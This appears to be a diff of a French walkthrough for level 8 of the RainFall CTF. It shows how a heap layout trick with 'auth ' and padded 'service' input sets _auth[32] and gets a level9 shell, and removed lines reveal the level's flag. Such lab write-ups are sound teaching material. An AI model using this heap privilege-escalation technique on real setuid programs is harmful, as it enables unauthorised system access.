@@ -1,56 +1,32 @@
-Arrivé sur le level 8 je check les fichiers, il y a un executable level8 qui s'y trouve.
-
-	level8@RainFall:~$ ls -la level8
-	-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
-
-Celui-ci dispose des droits d'execution de l'user level9. Je vais dessasembler le binaire avec cutter.
-
 Le programme est composé d'une seul fonction qui ne prend aucun argument comme paramètre.
-Une fois lancer elle attend qu'on lui rentre une chaine de charactère.
-Le programme contient deux varaible global:
+Une fois lancée elle attend qu'on lui rentre une chaine de charactère.
+Le programme contient deux variables globales:
 
 - _service
 - _auth
 
-On retrouve 4 chaine possible qu'elle accepte:
+On retrouve 4 chaine possibles qu'elle accepte:
 
 - "auth " Elle effectue une allocation de 4 sur la variable global _auth et copie la commande dans la variable.
 - "reset" Appele free et libère la variable global _auth
 - "service" Appele strdup de 'service' et renvoie le resultat dans la variable global _service
 - "login" Appele system(/bin/sh) si _auth[8] est différent de 0.
 
+On remarque que ce _auth[8] dans ghidra correspond en réalité à _auth[32] sur jsdec:
+eax = auth;
+eax = *((eax + 0x20));
 
-Je lance donc le programme et j'entre en paramètre 'auth '
+Les mallocs se faisant les un à la suite des autres dans la limite du possible, il serait possible d'utiliser service pour arriver jusqu'au 32eme octets après _auth:
 
+On lance donc le programme et entre en paramètre 'auth '
 	level8@RainFall:~$ ./level8
 	(nil), (nil)
 	auth
 	0x804a008, (nil)
 
-Ensuite j'entre en paramètre service
-
-	service
+Ensuite, on entre en paramètre service suivi d'au moins 24 octets(24 + 8 de l'adresse, pour arriver au 32eme)
+	serviceabcdefghijklmnopqrstuvwx
 	0x804a008, 0x804a018
-
-Mais la je remarque qu'il ne fait pas un malloc de 4 mais un malloc de 16
-j'appelle la fonction login, mais il rentre dans la première options et m'affiche 'Password:'
 	login
-	Password:
-	0x804a008, 0x804a018
-
-J'entre la commande auth encore une fois et je remarque qu'il avance de 16 de plus
-	service
-	0x804a008, 0x804a028
-J'entre encore la commande Login et cette fois il m'affiche un nouveau shell
-	login
-	$
-
-Il fallait donc entrer deux fois la commande service pour acceder au shell du login.
 	$ whoami
 	level9
-
-Il ne me reste plus qu'a me rendre dans le repertoir du level9 et d'afficher le contenu du fichier .pass
-	$ cd /home/user/level9
-	$ cat .pass
-	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
-
